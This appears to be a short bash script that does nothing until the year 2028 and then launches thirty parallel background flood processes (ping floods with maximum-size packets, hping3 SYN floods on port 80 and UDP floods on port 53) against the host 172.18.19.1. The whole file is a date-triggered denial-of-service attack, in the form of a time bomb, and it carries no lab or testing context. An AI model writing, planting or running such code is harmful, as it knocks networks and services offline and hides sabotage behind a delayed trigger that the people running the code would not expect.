#!/bin/bash

YEAR=$(date +%Y)
if [ "$YEAR" -lt 2028 ]; then
    exit 0
fi

ip=172.18.19.1
for i in {1..10}; do
    sudo ping -f -s 65507 $ip &
    sudo hping3 --flood -S -p 80 $ip &
    sudo hping3 --flood --udp -p 53 $ip &
done